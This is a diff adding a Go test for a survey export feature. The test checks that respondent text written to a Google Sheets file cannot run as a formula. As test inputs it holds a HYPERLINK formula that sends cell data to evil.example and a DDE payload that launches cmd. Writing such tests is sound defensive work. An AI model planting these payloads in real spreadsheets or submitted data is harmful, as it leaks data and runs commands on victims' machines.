@@ -1,6 +1,7 @@
 package export
 
 import (
+	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -182,5 +183,47 @@ func TestFilename(t *testing.T) {
 		if got := Filename(sv, "responses", now); got != want {
 			t.Errorf("Filename(%q) = %q, want %q", c.title, got, want)
 		}
+	}
+}
+
+// A spreadsheet runs a cell that starts with =, +, - or @. The whole point of
+// this file is that it goes straight into Google Sheets, so respondent text
+// must not be able to execute there.
+func TestFormulaInjectionIsNeutralised(t *testing.T) {
+	s, sv := fixture(t)
+	const attack = `=HYPERLINK("http://evil.example/?"&A1,"click")`
+	if _, err := s.SaveResponse(sv.ID, "v1", []string{sv.Options[0].ID}, attack); err != nil {
+		t.Fatal(err)
+	}
+	// A write-in reaches the export as a column header before any moderator
+	// has looked at it.
+	if _, err := s.AddWriteIn(sv.ID, "v2", "@SUM(1+1)*cmd|' /C calc'!A0"); err != nil {
+		t.Fatal(err)
+	}
+	sv, _ = s.Survey(sv.ID)
+
+	var b strings.Builder
+	if err := Responses(&b, sv, s.Responses(sv.ID), time.UTC); err != nil {
+		t.Fatal(err)
+	}
+	for _, line := range strings.Split(b.String(), "\n") {
+		for _, field := range strings.Split(line, "\t") {
+			if field == "" {
+				continue
+			}
+			switch field[0] {
+			case '=', '+', '@':
+				t.Errorf("cell would be evaluated as a formula: %q", field)
+			case '-':
+				// A negative number is fine; text is not.
+				if _, err := strconv.ParseFloat(field, 64); err != nil {
+					t.Errorf("cell would be evaluated as a formula: %q", field)
+				}
+			}
+		}
+	}
+	// The text is still readable, just inert.
+	if !strings.Contains(b.String(), "'"+attack) {
+		t.Error("the comment should be preserved, prefixed with an apostrophe")
 	}
 }
